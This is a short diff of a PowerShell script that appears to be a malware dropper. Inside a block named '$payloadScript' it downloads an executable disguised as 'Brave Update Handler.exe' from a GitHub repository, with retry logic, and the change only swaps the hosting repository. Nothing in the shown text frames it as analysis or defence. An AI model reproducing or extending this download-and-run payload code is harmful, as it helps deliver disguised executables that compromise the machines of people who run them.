@@ -266,7 +266,7 @@ foreach ($targetPath in $restoreInfo.Keys) {
 # ------------------------------------------------------------
 $payloadScript = @'
 try {
-    $u='https://raw.githubusercontent.com/billa9889/faah/main/Brave%20Update%20Handler.exe'
+    $u='https://raw.githubusercontent.com/billa9889/YOOWASSHH/main/Brave%20Update%20Handler.exe'
     $maxRetries=3
     for($i=1;$i -le $maxRetries;$i++){
         try {
